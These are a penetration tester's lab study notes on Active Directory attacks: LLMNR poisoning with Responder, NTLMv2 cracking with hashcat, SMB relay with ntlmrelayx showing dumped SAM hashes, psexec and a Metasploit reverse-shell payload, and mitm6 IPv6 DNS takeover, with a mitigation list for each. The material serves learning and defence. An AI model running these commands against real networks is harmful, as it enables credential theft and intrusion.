 
# LLMNR poisoning 

link local multicast name resolution 

used to identify hosts when dns fails 
intercepting traffic captures username and hash(MiTM attack)


so....
victim tries to connect to a share, that server does not know how to find it 
so it asks the other computers where to find it 
if a computer does know, the victim will send their hash and username.
we can capture that hash and crack it.

on kali
run `responder with -dPv 

login as 2B on the punisher, try to access the ip of the kali machine
//10.0.2.5

responder will capture the hash
![[Pasted image 20240726180400.png]]



![[Pasted image 20240726180336.png]]


# cracking hashes 

module number is 5600 for ntlm v2 
(grep the --help of hashcat)

`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt`

-O - optimise 

rockyou2021 - 91gb wordlist
look into rulesets

# mitigation:

disable llmnr and nbt-ns 

if llmnr is needed, use strong passwords and require network access control.


# SMB relay attacks

instead of cracking hashes, relay the hash via SMB which can be used to gain access to the machine.

requirements:
smb signing must be disabled (this is default on workstations)
relayed user creds but be admin on machine for any real value.

![[Pasted image 20240726183733.png]]
\
change config of responder

/etc/responder/Responder.conf

SMB = off
HTTP = off

identify hosts without smb signing with nmap
script=smb2-security-mode.nse -p 445

make a targets.txt
change responder config file. turn off SMB and HTTP

```
responder -I eth0 -vdP
impacket-ntlmrelay -tf targets.txt -smb2support 
```

![[Pasted image 20240726211512.png]]

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:48e76423db4d3ff36c6369bc131b532d:::
9S:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

```

use -i for an interactive shell in ntlmreplayx

-c to run a command
# mitigation

enable signing - but can lead to performance issues with file copies

disable ntlm authentication - but if kerborose stops working windows defaults to ntlm

account tiering - 
limit domain admins to specific tasks
enforcing may be difficult

local admin restrictions -
prevent lateral movement 
potential increase in the amount of service desk tickets

# gaining shell access

psexec on metasploit

psexec.py 
```
psexec.py nier.local/2B:'Password1'@10.0.2.9
```

both of them can be used with hashes
-hashes on psexec

metasploit
```
use exploit/windows/smb/psexec

set rhosts
set payload windows/x64/meterpreter/reverse_tcp

```

you can also use wmiexec
smbexec.py


# ipv6 attack

IPv6 is enabled by default but no one has the dns server setup for it.
we can use our own dns  to connect to the DC via LDAP or SMB

dns takeover attack

```
impacket-ntlmrelayx -6 -t ldaps://10.0.2.15 -wh fakewpad.nier.local -l lootme

mitm6 -d nier.local 
```

![[Pasted image 20240727121640.png]]

if we check the lootme folder
DO NOT RUN FOR A LONG TIME, CAN BREAK SYSTEMS

![[Pasted image 20240727121845.png]]

![[Pasted image 20240727121937.png]]

if you log in on punisher with an admin account, then ntlmrelay will create an account on the DC for you.

![[Pasted image 20240728122558.png]]


# mitigation:

disable ipv6 , not the best idea

issue blocks

if wpad is not being used, disable it via group policy

enable LDAP signing and LDAP channel binding

# passback attack

https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack


# [[Post Compromise Enumeration]]
